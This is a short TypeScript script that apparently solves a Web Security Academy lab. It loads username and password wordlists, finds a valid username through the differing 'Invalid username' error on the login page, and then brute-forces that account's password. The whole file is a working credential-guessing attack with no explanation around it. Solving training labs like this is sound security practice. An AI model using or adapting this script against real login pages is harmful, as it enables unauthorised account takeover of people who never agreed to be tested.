import axios from "axios";
import * as fs from "fs";
// import fetch from "node-fetch";

const subdomain = "acaa1fac1efff3ccc06b4902001a0005";
const loginURL = `https://${subdomain}.web-security-academy.net/login`;

const attack = async () => {
  const usernameCandidates = fs
    .readFileSync(__dirname + "/username_candidates.txt")
    .toString()
    .split("\n");

  console.log(usernameCandidates);

  const passwordCandidates = fs
    .readFileSync(__dirname + "/password_candidates.txt")
    .toString()
    .split("\n");

  console.log(passwordCandidates);

  let validUsername;

  for (let usernameCandidate of usernameCandidates) {
    try {
      const response = await axios.post(
        loginURL,
        `username=${usernameCandidate}&password=123`
      );
      console.log(response.data.includes("Invalid username"));
      if (!response.data.includes("Invalid username")) {
        validUsername = usernameCandidate;
        console.log("Valid username is: ", validUsername);
        break;
      }
    } catch (e) {
      console.log(e);
      throw e;
    }
  }

  for (let passwordCandidate of passwordCandidates) {
    const response = await axios.post(
      loginURL,
      `username=${validUsername}&password=${[passwordCandidate]}`
    );
    console.log(response);

    if (!response.data.includes("Incorrect password")) {
      console.log(
        "Username and password is: ",
        validUsername,
        " ",
        passwordCandidate
      );
      break;
    }
  }
};

try {
  attack();
} catch (e) {
  console.log(e);
  throw e;
}
